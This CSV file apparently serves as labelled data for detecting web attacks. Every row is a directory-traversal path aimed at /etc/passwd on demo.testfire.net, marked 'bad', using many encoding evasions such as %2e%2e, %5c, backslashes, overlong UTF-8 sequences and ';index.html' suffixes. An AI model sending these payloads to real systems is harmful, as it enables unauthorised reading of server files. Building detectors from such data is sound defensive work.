path,content,host,class_flag
/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd,,demo.testfire.net,['bad']
/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd,,demo.testfire.net,['bad']
/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd,,demo.testfire.net,['bad']
/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd,,demo.testfire.net,['bad']
/..%c1%9c/etc/passwd,,demo.testfire.net,['bad']
/..%c1%9c..%c1%9c/etc/passwd,,demo.testfire.net,['bad']
/..%c1%9c..%c1%9c..%c1%9c/etc/passwd,,demo.testfire.net,['bad']
/..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd,,demo.testfire.net,['bad']
/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd,,demo.testfire.net,['bad']
/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd,,demo.testfire.net,['bad']
/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd,,demo.testfire.net,['bad']
/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd,,demo.testfire.net,['bad']
/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd,,demo.testfire.net,['bad']
/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd,,demo.testfire.net,['bad']
/%c0%ae%c0%ae\/etc/passwd,,demo.testfire.net,['bad']
/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd,,demo.testfire.net,['bad']
/%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd,,demo.testfire.net,['bad']
/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd,,demo.testfire.net,['bad']
/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd,,demo.testfire.net,['bad']
/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd,,demo.testfire.net,['bad']
/%c0%ae%c0%ae%c1%9c/etc/passwd,,demo.testfire.net,['bad']
/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd,,demo.testfire.net,['bad']
/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd,,demo.testfire.net,['bad']
/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd,,demo.testfire.net,['bad']
/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd,,demo.testfire.net,['bad']
/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd,,demo.testfire.net,['bad']
/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd,,demo.testfire.net,['bad']
/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd,,demo.testfire.net,['bad']
/..%2f/etc/passwd,,demo.testfire.net,['bad']
/..%2f..%2f/etc/passwd,,demo.testfire.net,['bad']
/..%2f..%2f..%2f/etc/passwd,,demo.testfire.net,['bad']
/..%2f..%2f..%2f..%2f..%2f/etc/passwd,,demo.testfire.net,['bad']
/..%2f..%2f..%2f..%2f/etc/passwd,,demo.testfire.net,['bad']
/..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd,,demo.testfire.net,['bad']
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd,,demo.testfire.net,['bad']
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd,,demo.testfire.net,['bad']
/%2e%2e//etc/passwd,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e//etc/passwd,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e//etc/passwd,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,,demo.testfire.net,['bad']
/%2e%2e%2f/etc/passwd,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f/etc/passwd,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd,,demo.testfire.net,['bad']
/..%5c/etc/passwd,,demo.testfire.net,['bad']
/..%5c..%5c/etc/passwd,,demo.testfire.net,['bad']
/..%5c..%5c..%5c/etc/passwd,,demo.testfire.net,['bad']
/..%5c..%5c..%5c..%5c/etc/passwd,,demo.testfire.net,['bad']
/..%5c..%5c..%5c..%5c..%5c/etc/passwd,,demo.testfire.net,['bad']
/..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd,,demo.testfire.net,['bad']
/..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd,,demo.testfire.net,['bad']
/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd,,demo.testfire.net,['bad']
/%2e%2e//etc/passwd,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e//etc/passwd,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e//etc/passwd,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,,demo.testfire.net,['bad']
/%2e%2e%5c/etc/passwd,,demo.testfire.net,['bad']
/%2e%2e%5c%2e%2e%5c/etc/passwd,,demo.testfire.net,['bad']
/%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd,,demo.testfire.net,['bad']
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd,,demo.testfire.net,['bad']
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd,,demo.testfire.net,['bad']
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd,,demo.testfire.net,['bad']
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd,,demo.testfire.net,['bad']
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd,,demo.testfire.net,['bad']
/..//etc/passwd index.html,,demo.testfire.net,['bad']
/../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../../../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/..//etc/passwd index.html,,demo.testfire.net,['bad']
/../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../../../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/..//etc/passwd index.html,,demo.testfire.net,['bad']
/../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../../../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/..//etc/passwd index.html,,demo.testfire.net,['bad']
/../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/../../../../../../../..//etc/passwd index.html,,demo.testfire.net,['bad']
/..%2f/etc/passwd index.html,,demo.testfire.net,['bad']
/..%2f..%2f/etc/passwd index.html,,demo.testfire.net,['bad']
/..%2f..%2f..%2f/etc/passwd index.html,,demo.testfire.net,['bad']
/..%2f..%2f..%2f..%2f/etc/passwd index.html,,demo.testfire.net,['bad']
/..%2f..%2f..%2f..%2f..%2f/etc/passwd index.html,,demo.testfire.net,['bad']
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd index.html,,demo.testfire.net,['bad']
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd index.html,,demo.testfire.net,['bad']
/..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e//etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e//etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e//etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e%2f/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd index.html,,demo.testfire.net,['bad']
/..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\..\/etc/passwd index.html,,demo.testfire.net,['bad']
/..%5c/etc/passwd index.html,,demo.testfire.net,['bad']
/..%5c..%5c/etc/passwd index.html,,demo.testfire.net,['bad']
/..%5c..%5c..%5c/etc/passwd index.html,,demo.testfire.net,['bad']
/..%5c..%5c..%5c..%5c/etc/passwd index.html,,demo.testfire.net,['bad']
/..%5c..%5c..%5c..%5c..%5c/etc/passwd index.html,,demo.testfire.net,['bad']
/..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd index.html,,demo.testfire.net,['bad']
/..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd index.html,,demo.testfire.net,['bad']
/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e\/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e\%2e%2e\/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e\%2e%2e\%2e%2e\/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e%5c/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e%5c%2e%2e%5c/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd index.html,,demo.testfire.net,['bad']
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd index.html,,demo.testfire.net,['bad']
/..//etc/passwd;index.html,,demo.testfire.net,['bad']
/../..//etc/passwd;index.html,,demo.testfire.net,['bad']
/../../../../../..//etc/passwd;index.html,,demo.testfire.net,['bad']
/../../../../..//etc/passwd;index.html,,demo.testfire.net,['bad']
/../../../../../../..//etc/passwd;index.html,,demo.testfire.net,['bad']
/../../../../../../../..//etc/passwd;index.html,,demo.testfire.net,['bad']
/..//etc/passwd;index.html,,demo.testfire.net,['bad']
/../..//etc/passwd;index.html,,demo.testfire.net,['bad']
/../../..//etc/passwd;index.html,,demo.testfire.net,['bad']
/../../../..//etc/passwd;index.html,,demo.testfire.net,['bad']
/../../../../..//etc/passwd;index.html,,demo.testfire.net,['bad']
/../../../../../../..//etc/passwd;index.html,,demo.testfire.net,['bad']
/../../../../../../../..//etc/passwd;index.html,,demo.testfire.net,['bad']
/..//etc/passwd;index.html,,demo.testfire.net,['bad']
/../..//etc/passwd;index.html,,demo.testfire.net,['bad']
/../../..//etc/passwd;index.html,,demo.testfire.net,['bad']
/../../../..//etc/passwd;index.html,,demo.testfire.net,['bad']
/../../../../..//etc/passwd;index.html,,demo.testfire.net,['bad']
/../../../../../..//etc/passwd;index.html,,demo.testfire.net,['bad']
/../../../../../../..//etc/passwd;index.html,,demo.testfire.net,['bad']
/../../../../../..//etc/passwd;index.html,,demo.testfire.net,['bad']
/../../../../../../../..//etc/passwd;index.html,,demo.testfire.net,['bad']
/..%2f/etc/passwd;index.html,,demo.testfire.net,['bad']
/..%2f..%2f/etc/passwd;index.html,,demo.testfire.net,['bad']
/..%2f..%2f..%2f/etc/passwd;index.html,,demo.testfire.net,['bad']
/..%2f..%2f..%2f..%2f/etc/passwd;index.html,,demo.testfire.net,['bad']
/..%2f..%2f..%2f..%2f..%2f/etc/passwd;index.html,,demo.testfire.net,['bad']
/..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd;index.html,,demo.testfire.net,['bad']
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd;index.html,,demo.testfire.net,['bad']
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e//etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e//etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e//etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e%2f/etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f/etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..\..\..\..\..\..\..\..\/etc/passwd;index.html,,demo.testfire.net,['bad']
/..%5c/etc/passwd;index.html,,demo.testfire.net,['bad']
/..%5c..%5c/etc/passwd;index.html,,demo.testfire.net,['bad']
/..%5c..%5c..%5c/etc/passwd;index.html,,demo.testfire.net,['bad']
/..%5c..%5c..%5c..%5c/etc/passwd;index.html,,demo.testfire.net,['bad']
/..%5c..%5c..%5c..%5c..%5c/etc/passwd;index.html,,demo.testfire.net,['bad']
/..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd;index.html,,demo.testfire.net,['bad']
/..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd;index.html,,demo.testfire.net,['bad']
/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e\/etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e\%2e%2e\/etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e\%2e%2e\%2e%2e\/etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd;index.html,,demo.testfire.net,['bad']
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd;index.html,,demo.testfire.net,['bad']
